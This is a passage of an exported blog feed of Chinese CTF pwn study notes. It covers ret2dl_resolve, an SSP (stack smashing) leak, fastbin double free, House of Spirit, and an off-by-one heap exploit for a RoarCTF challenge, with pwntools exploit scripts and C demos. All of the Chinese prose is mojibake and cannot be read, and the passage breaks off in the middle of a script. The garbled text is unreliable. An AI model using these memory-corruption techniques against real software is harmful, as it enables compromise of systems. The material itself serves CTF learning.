é€’ç»™è¢«åŠ«æŒè°ƒç”¨çš„å‡½æ•°çš„å‚æ•°ã€‚è¿™é‡Œæˆ‘ä»¬å°†"/bin/sh\x00"æ”¾ç½®åœ¨bss_addrå¤„ï¼Œlink_mapæ”¾ç½®åœ¨bss_addr+0x20å¤„</span></span><br><span class="line"></span><br><span class="line">io.write(buf)</span><br><span class="line"></span><br><span class="line">ç„¶åæˆ‘ä»¬ç›´æ¥ç”¨dl_resolve_dataç”Ÿæˆä¼ªé€ çš„link_mapå¹¶å‘é€</span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)                </span><br><span class="line">buf += rop.fill(<span class="number">0x20</span>, buf)                <span class="comment">#å¦‚æœfillçš„ç¬¬äºŒä¸ªå‚æ•°è¢«æŒ‡å®šï¼Œç›¸å½“äºå°†ç¬¬äºŒä¸ªå‚æ•°å‘½åçš„å­—ç¬¦ä¸²å¡«å……è‡³æŒ‡å®šé•¿åº¦</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_addr+<span class="number">0x20</span>, <span class="string">'system'</span>)        <span class="comment">#dl_resolve_dataçš„å‚æ•°ä¹Ÿéå¸¸ç®€å•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¼ªé€ çš„link_mapé¦–åœ°å€ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦ä¼ªé€ çš„å‡½æ•°å</span></span><br><span class="line">buf += rop.fill(<span class="number">0x100</span>, buf)</span><br><span class="line"></span><br><span class="line">io.write(buf)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¯¹äºcanaryçš„ssp leakæ‰“æ³•çš„å­¦ä¹ ï¼ˆå¥½åƒåˆåStack smashï¼‰</title>
      <link href="/2019/10/28/%E5%AF%B9%E4%BA%8Ecanary%E7%9A%84ssp-leak%E6%89%93%E6%B3%95%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%A5%BD%E5%83%8F%E5%8F%88%E5%90%8DStack-smash%EF%BC%89/"/>
      <url>/2019/10/28/%E5%AF%B9%E4%BA%8Ecanary%E7%9A%84ssp-leak%E6%89%93%E6%B3%95%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%A5%BD%E5%83%8F%E5%8F%88%E5%90%8DStack-smash%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>è¿™é‡Œæ¬ä¸çŸ¥è€»çš„å…ˆç²˜è´´ä¸€å¤§æ®µiæ˜¥ç§‹å…³äºssp leakæ‰“æ³•çš„è®²è§£ã€‚<del>å…¶å®å°±æ˜¯èœï¼Œè‡ªå·±è®²ä¸å‡ºä¸ªæ‰€ä»¥ç„¶</del></p><p> é™¤äº†é€šè¿‡å„ç§æ–¹æ³•æ³„éœ²canaryä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªå¯é€‰é¡¹â€”â€”åˆ©ç”¨<code>__stack_chk_fail</code>å‡½æ•°æ³„éœ²ä¿¡æ¯ã€‚è¿™ç§æ–¹æ³•ä½œç”¨ä¸å¤§ï¼Œæ²¡åŠæ³•è®©æˆ‘ä»¬getshellã€‚ä½†æ˜¯å½“æˆ‘ä»¬éœ€è¦æ³„éœ²çš„flagæˆ–è€…å…¶ä»–ä¸œè¥¿å­˜åœ¨äºå†…å­˜ä¸­æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´æ¥æŠŠå®ƒä»¬æ³„éœ²å‡ºæ¥ã€‚è¿™ä¸ªæ–¹æ³•å«åš<code>SSP(Stack Smashing Protect) Leak</code>.<br>åœ¨å¼€å§‹ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥å›é¡¾ä¸€ä¸‹canaryèµ·ä½œç”¨åˆ°ç¨‹åºé€€å‡ºçš„æµç¨‹ã€‚é¦–å…ˆï¼Œcanaryè¢«æ£€æµ‹åˆ°ä¿®æ”¹ï¼Œå‡½æ•°ä¸ä¼šç»è¿‡æ­£å¸¸çš„æµç¨‹ç»“æŸæ ˆå¸§å¹¶ç»§ç»­æ‰§è¡Œæ¥ä¸‹æ¥çš„ä»£ç ï¼Œè€Œæ˜¯è·³è½¬åˆ°<code>call __stack_chk_fail</code>å¤„ï¼Œç„¶åå¯¹äºæˆ‘ä»¬æ¥è¯´ï¼Œæ‰§è¡Œå®Œè¿™ä¸ªå‡½æ•°ï¼Œç¨‹åºé€€å‡ºï¼Œå±å¹•ä¸Šç•™ä¸‹ä¸€è¡Œ<br><code>*** stack smashing detected ***:[XXX] terminated</code>ã€‚è¿™é‡Œçš„[XXX]æ˜¯ç¨‹åºçš„åå­—ã€‚å¾ˆæ˜¾ç„¶ï¼Œè¿™è¡Œå­—ä¸å¯èƒ½å‡­ç©ºäº§ç”Ÿï¼Œè‚¯å®šæ˜¯<code>__stack_chk_fail</code>æ‰“å°å‡ºæ¥çš„ã€‚è€Œä¸”ï¼Œç¨‹åºçš„åå­—ä¸€å®šæ˜¯ä¸ªæ¥è‡ªå¤–éƒ¨çš„å˜é‡ï¼ˆæ¯•ç«ŸELFæ ¼å¼é‡Œé¢å¯æ²¡æœ‰ä¿å­˜ç¨‹åºåï¼‰ã€‚æ—¢ç„¶æ˜¯ä¸ªæ¥è‡ªå¤–éƒ¨çš„å˜é‡ï¼Œå°±æœ‰ä¿®æ”¹çš„ä½™åœ°ã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹<code>__stack_chk_fail</code>çš„æºç ï¼Œä¼šå‘ç°å…¶å®ç°å¦‚ä¸‹ï¼š </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>) </span><br><span class="line">&#123;  </span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg) </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="comment">/* The loop is added only to keep gcc happy. */</span> </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)   </span><br><span class="line">        __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,             </span><br><span class="line">                        msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> æˆ‘ä»¬çœ‹åˆ°<code>__libc_message</code>ä¸€è¡Œè¾“å‡ºäº†<code>*** %s ***: %s terminated\n</code>ã€‚è¿™é‡Œçš„å‚æ•°åˆ†åˆ«æ˜¯msgå’Œ<code>__libc_argv[0]</code>ã€‚<code>char *argv[]</code>æ˜¯mainå‡½æ•°çš„å‚æ•°ï¼Œ<code>argv[0]</code>å­˜å‚¨çš„å°±æ˜¯ç¨‹åºåï¼Œä¸”è¿™ä¸ªargv[0]å°±å­˜åœ¨äºæ ˆä¸Šã€‚</p><p>è¿™é‡Œè´´ä¸€ä¸ªvidarçš„ Veritas501 å¸ˆå‚…çš„è®²è§£</p><p>å¯è§ï¼Œ__libc_message çš„ç¬¬äºŒä¸ª<code>%s</code>è¾“å‡ºçš„æ˜¯argv[0]ï¼Œargv[0]æ˜¯æŒ‡å‘ç¬¬ä¸€ä¸ªå¯åŠ¨å‚æ•°å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼Œè€Œåœ¨æ ˆä¸­ï¼Œå¤§æ¦‚æ˜¯è¿™æ ·ä¸€ä¸ªç”»é£ </p><img src="/2019/10/28/å¯¹äºcanaryçš„ssp-leakæ‰“æ³•çš„å­¦ä¹ ï¼ˆå¥½åƒåˆåStack-smashï¼‰/canary_a768142147ca3976598941b5c6c67161.png"><p>æ‰€ä»¥SSP leakçš„ç©æ³•å°±æ˜¯é€šè¿‡ä¿®æ”¹æ ˆä¸Šçš„argv[0]æŒ‡é’ˆï¼Œä»è€Œè®©<code>__stack_chk_fail</code>è¢«è§¦å‘åè¾“å‡ºæˆ‘ä»¬æƒ³è¦çŸ¥é“çš„ä¸œè¥¿ã€‚ </p><p>æ‰€ä»¥â€¦â€¦  è¿™ä½vidarçš„pwnç‹æ„æ€å°±æ˜¯ï¼Œç®¡ä»–ä¸‰ä¸ƒäºŒåä¸€ï¼Œæš´åŠ›è¦†ç›–å°±æ˜¯äº†ï¼Œåˆ«ç®¡å¤šé•¿ï¼Œåªè¦ä½ è¦çš„æ•°æ®çš„åœ°å€ä½ èƒ½æ‹¿åˆ°ï¼Œè¦†ç›–ï¼</p><p>è¿™é‡Œæ”¾ä¸€ä¸ªä¾‹é¢˜ï¼Œä¸‰å¶è‰çš„çº³æ–°é¢˜ï¼Œcanary2</p><img src="/2019/10/28/å¯¹äºcanaryçš„ssp-leakæ‰“æ³•çš„å­¦ä¹ ï¼ˆå¥½åƒåˆåStack-smashï¼‰/20191023235955.png"><p>ä¸€çœ‹ï¼Œæ— æ³•æ³„éœ²ï¼Œä¹Ÿä¸èƒ½çˆ†ç ´ï¼Œé‚£è‡ªç„¶å°±æƒ³åˆ°ssp leakæ‰“æ³•</p><p>flagçš„åœ°å€åœ¨bufé‡Œé¢ï¼Œä½ åˆèƒ½é€šè¿‡printf  get  bufåœ°å€ã€‚ é‚£å‰©ä¸‹çš„å°±åªæœ‰æš´åŠ›è¦†ç›–äº†</p><p>è¿™é‡Œè´´ä¸Šexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./canary2'</span>)</span><br><span class="line"><span class="comment">#sh = remote('pwnto.fun',10007)</span></span><br><span class="line">sh.recvuntil(<span class="string">'key: '</span>)</span><br><span class="line">key = sh.recv(<span class="number">9</span>)</span><br><span class="line">log.success(<span class="string">"the key="</span>+ key)</span><br><span class="line">key = key[<span class="number">2</span>:]</span><br><span class="line">log.success(<span class="string">"the key="</span>+ key)</span><br><span class="line">key = int(key,<span class="number">16</span>)</span><br><span class="line">payload = p64(key)*<span class="number">200</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline()</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure><p>â€‹        å¯¹äº†ï¼Œè¿™é‡Œè®°å½•ä¸€ç‚¹æˆ‘ä¸ªäººçš„å°é—®é¢˜ï¼Œrecvæ¥æ”¶åçš„keyæ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæ‰€ä»¥ä¸è¿›è¡Œp64(key)ç›´æ¥å‘è¿‡å»çš„æ˜¯ascllï¼Œä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„æŒ‡é’ˆç±»å‹ã€‚</p><p>â€‹        å¯»æ€ç€ï¼Œé‚£æ‰“åŒ…ä¸€ä¸‹å°±å¯ä»¥äº†å§ã€‚å‘ç°p64(key)å¤±è´¥ï¼Œæ¢ç©¶äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯å­—ç¬¦ä¸²å‹è½¬å­—ç¬¦ä¸²å‹å¤±è´¥ã€‚åˆæƒ³ç€key = int(key)ï¼Œä¹Ÿä¸æˆåŠŸã€‚é‚£æ˜¯å› ä¸ºï¼Œint()æ˜¯æœ‰ä¸¤ä¸ªå‚æ•°çš„ï¼Œæˆ‘ä»¥å‰ä¸€ç›´ä»¥ä¸ºç›´æ¥int(x)å°±å¥½äº†ã€‚2333333333</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Â–fastedbin attack æ¢ç©¶</title>
      <link href="/2019/10/28/%C2%96fastedbin-attack-%E6%8E%A2%E7%A9%B6/"/>
      <url>/2019/10/28/%C2%96fastedbin-attack-%E6%8E%A2%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<h3 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h3><p> Fastbin Double Free æ˜¯æŒ‡ fastbin çš„ chunk å¯ä»¥è¢«å¤šæ¬¡é‡Šæ”¾ï¼Œå› æ­¤å¯ä»¥åœ¨ fastbin é“¾è¡¨ä¸­å­˜åœ¨å¤šæ¬¡ ã€‚</p><p>ç±»ä¼¼äº <img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/figure/fastbin_free_chunk3.png" alt="img"> </p><p>æ­¤æ—¶ï¼Œchunk1è¢«å†æ¬¡é‡Šæ”¾ï¼Œå…¶fdæŒ‡å‘chunk2ã€‚</p><p>æˆ‘ä»¬è¿›è¡Œç¬¬ä¸€æ¬¡mallocï¼Œå¾—åˆ°chunk1ï¼Œç„¶ååœ¨chunk1.fdçš„ä½ç½®å†™å…¥ä½ æƒ³è¦çš„åœ°å€ï¼Œç„¶åè¿›è¡Œç¬¬äºŒæ¬¡mallocï¼Œè·å¾—chunk2ï¼Œå†è¿›è¡Œç¬¬ä¸‰æ¬¡mallocï¼Œå†æ¬¡å¾—åˆ°chunk1ï¼Œå› ä¸ºæ­¤æ—¶chunk1çš„fdå·²ç»è¢«ä½ ä¿®æ”¹ä¸ºä½ æƒ³è¦çš„åœ°å€ï¼Œæ‰€ä»¥ä½ è¿›è¡Œç¬¬å››æ¬¡mallocçš„æ—¶å€™ï¼Œä¼šä¾æ®ä½ chunk1.fdçš„å†…å®¹åœ¨é‚£ä¸ªåœ°å€è¿›è¡Œå †å—åˆ†é…ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pre_size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> fd;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line">CHUNK bss_chunk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    <span class="keyword">void</span> *chunk_a,*chunk_b;</span><br><span class="line"></span><br><span class="line">    bss_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//chunk1</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)chunk_a=&amp;bss_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//å†ä¸€æ¬¡mallocçš„chunk1</span></span><br><span class="line">    chunk_b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//æ­¤æ—¶æ ¹æ®ä½ ç¬¬ä¸€æ¬¡mallocæ—¶å†™å¥½çš„chunk1.fdè¿›è¡Œåˆ†é…å †å—ã€‚</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p"</span>,chunk_b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h3><p> è¯¥æŠ€æœ¯çš„æ ¸å¿ƒåœ¨äºåœ¨ç›®æ ‡ä½ç½®å¤„ä¼ªé€  fastbin chunkï¼Œå¹¶å°†å…¶é‡Šæ”¾ï¼Œä»è€Œè¾¾åˆ°åˆ†é…<strong>æŒ‡å®šåœ°å€</strong>çš„ chunk çš„ç›®çš„ã€‚ </p><p>è¿™é‡Œï¼Œä¸»è¦æœ‰å‡ ä¸ªæœ¬æ†¨æ†¨å­¦çš„æ—¶å€™éš¾ä»¥ç†è§£çš„ç‚¹ï¼Œæ¥è®²è§£ä¸€ä¸‹ã€‚</p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5C%C2%96fastedbin-attack-%E6%8E%A2%E7%A9%B6%5Cimage-20200415101909292.png" alt="image-20200415101909292"></p><p>æˆ‘ä»¬æƒ³è¦æ§åˆ¶data2ä¸­çš„æ•°æ®ï¼Œå¯data2ä¸­çš„æ•°æ®æˆ‘ä»¬æ ¹æœ¬æ— æ³•è¿›è¡Œæ“ä½œï¼Œä½†æ˜¯data1å’Œdata3çš„æ•°æ®æˆ‘ä»¬æœ‰æƒé™å’Œèƒ½åŠ›è¿›è¡Œä¿®æ”¹</p><p>å¹¶ä¸”ï¼ï¼ï¼ï¼ï¼ï¼ï¼</p><p>æˆ‘ä»¬æœ‰èƒ½åŠ›å»æ”¹åŠ¨å †å—æŒ‡é’ˆï¼Œä½¿å¾—å †å—æŒ‡é’ˆèƒ½æŒ‡å‘æˆ‘ä»¬è¦çš„ä¼ªé€ åœ°å€</p><p>è¿™ä¸ªæ—¶å€™å°±å®Œç¾ç¬¦åˆHouse of Spiritçš„æ”»å‡»è¦æ±‚äº†ã€‚</p><p>åˆ©ç”¨æ€è·¯æ˜¯:</p><p>ï¼ˆ1ï¼‰å…ˆåœ¨data1ä¸­ä¼ªé€ å †å—ï¼Œä½¿å¾—ä¼ªé€ çš„chunkçš„sizeä½èƒ½å¤Ÿå®Œç¾åŒ…å«data2ï¼Œå¹¶ä¸”åœ¨data3ä¸­ä¼ªé€ å¥½ä¸‹ä¸€ä¸ªå †å—ï¼Œä»¥ç»•è¿‡æ£€æµ‹ã€‚</p><p>ï¼ˆ2ï¼‰æ”¹åŠ¨å †å—æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„å †å—(è¿™é‡Œæ³¨æ„ï¼ŒæŒ‡å‘çš„å¾—æ˜¯ä¼ªé€ chunkçš„mem(ä¹Ÿå°±æ˜¯dataåŸŸ) è€Œä¸æ˜¯headåŸŸ)ã€‚</p><p>ï¼ˆ3ï¼‰å°†æŒ‡é’ˆæŒ‡å‘çš„ä¼ªé€ chunkè¿›è¡Œfreeï¼Œä½¿å…¶æ”¾å…¥fast bin å•é“¾è¡¨é‡Œã€‚</p><p>ï¼ˆ4ï¼‰ç”³è¯·å †å—ï¼Œè¿™æ ·ï¼Œå°±ä¼šç”³è¯·åˆ°data1ä¸­ï¼Œdata2çš„æ•°æ®å°±å¯æ§å•¦<del>~</del>ã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯:</p><p>1.mmapæ ‡å¿—ä½ä¸èƒ½è¢«ç½®1ï¼Œä¸ç„¶ä¼šè°ƒç”¨munmap_chunkå»é‡Šæ”¾chunk(æˆ‘å¯»æ€ï¼Œä¸€èˆ¬æ²¡äººä¼šè§¦å‘è¿™ä¸ªæ£€æµ‹æœºåˆ¶æŠ¥é”™çš„)</p><p>2.ä¼ªé€ chunkçš„sizeå­—æ®µä¸èƒ½è¶…è¿‡fastbinæœ€å¤§å€¼(æˆ‘å¯»æ€ï¼Œè¿™ç©æ„å„¿ä¸€èˆ¬ä¹Ÿæ²¡äººä¼šå‚»åˆ°è§¦å‘æŠ¥é”™)</p><p>3.åœ¨åˆ©ç”¨æ€è·¯(3)è¿™é‡Œï¼Œå› ä¸ºæ˜¯fastbinï¼Œæ‰€ä»¥è¿˜ä¼šå¯¹åä¸€ä¸ªå †å—çš„sizeè¿›è¡Œæ£€æµ‹ï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢è¿™ä¸ª</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">        || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">                          &gt;= av-&gt;system_mem, <span class="number">0</span>))                        </span><br><span class="line">    <span class="comment">/*æœ€åæ˜¯ä¸‹ä¸€ä¸ªå †å—çš„å¤§å°ï¼Œè¦å¤§äº2*SIZE_ZEå°äºsystem_mem*/</span></span><br></pre></td></tr></table></figure><p>å¯¹åº”åˆ°ä¼ªé€ å †å—é‚£å¼ ç¤ºæ„å›¾æ¥è¯´ï¼Œéœ€è¦åœ¨data1ä¸­ä¼ªé€ å¥½sizeå­—æ®µç»•è¿‡ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªæ£€æŸ¥ï¼Œdata3åˆ™æ˜¯ä¼ªé€ çš„æ˜¯ä¸‹ä¸€ä¸ªå †å—çš„sizeæ¥ç»•è¿‡æœ€åä¸€ä¸ªæ£€æŸ¥ã€‚</p><p>å¯ä»¥è¿›è¡Œå¦‚å›¾æ‰€ç¤ºçš„ä¸€ç§æ„é€ </p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5C%C2%96fastedbin-attack-%E6%8E%A2%E7%A9%B6%5Cimage-20200415105145170.png" alt="image-20200415105145170"></p><h3 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h3><h4 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h4><p>è¿™é¢˜æ¥æºäºroar ctfã€‚</p><p>è¿™é¢˜çš„æ¼æ´ç‚¹åœ¨äºwriteçš„æ—¶å€™å‡ºç°äº†off by oneæ¼æ´ï¼Œæ¼æ´è§„åˆ™åœ¨äº åªè¦ä½ editçš„sizeæ¯”åŸsizeå¤§10ï¼Œå°±å¯é€ æˆoff by oneã€‚åˆ©ç”¨å°±æ˜¯off by one + chunk overlapping + fasted bin attack</p><p>é‚£ä¹ˆç»“åˆexpå¼€å§‹æ·±å…¥åˆ†æ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./easy_pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line">    sh.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'4'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br></pre></td></tr></table></figure><p>æ­¤å¤„å…ˆæ„é€ å¥½å †å—ï¼Œä¸ºä»€ä¹ˆè®¾ç½®0x18å‘¢ã€‚</p> <img src="/2019/10/28/Â–fastedbin-attack-æ¢ç©¶/1571551706196.png"> <p>è¿™é¢˜çš„è§„åˆ™å°±æ˜¯ä½ createçš„sizeä½å¤šå°‘ï¼Œå®ƒå°±å…è®¸ä½ å†™å…¥å¤šå°‘ï¼Œoff by oneä¿®æ”¹ä¸‹ä¸€å †å—çš„sizeä½çš„è¯ï¼Œè‡ªç„¶éœ€è¦0x18çš„sizeï¼Œè¦†ç›–pre_sizeï¼Œä½¿å¾—off by oneèƒ½å¤Ÿè¦†ç›–ä¸‹ä¸€å †å—çš„sizeä½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span> +<span class="number">10</span>, <span class="string">'a'</span>*<span class="number">0x18</span> + p8(<span class="number">0x91</span>) )</span><br></pre></td></tr></table></figure><img src="/2019/10/28/Â–fastedbin-attack-æ¢ç©¶/1571551912003.png"><p>æˆåŠŸä¿®æ”¹ï¼æ³¨æ„ï¼Œè¿™é‡Œä½¿ç”¨äº†å †å æŠ€å·§ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>å°†æ•´ä¸ª0x91çš„ä¼ªé€ å †å—æ”¾å…¥unsorted biné‡Œé¢</p><img src="/2019/10/28/Â–fastedbin-attack-æ¢ç©¶/1571552115654.png"><img src="/2019/10/28/Â–fastedbin-attack-æ¢ç©¶/1571552133076.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ä¸ºäº†createåˆ†å‰²å †å—ï¼Œä½¿å¾—unsorted binçš„åœ°å€è½å…¥chunk2çš„å†…å®¹é‡Œã€‚å› ä¸ºchunk2å®é™…ä¸Šæ²¡æœ‰è¢«freeï¼Œæ‰€ä»¥å…è®¸showå‡ºåœ°å€ã€‚åŒæ—¶ä¸ºäº†ä¸‹é¢çš„fastedbin attackåšå‡†å¤‡ã€‚</p><img src="/2019/10/28/Â–fastedbin-attack-æ¢ç©¶/1571552279804.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">result = u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'result 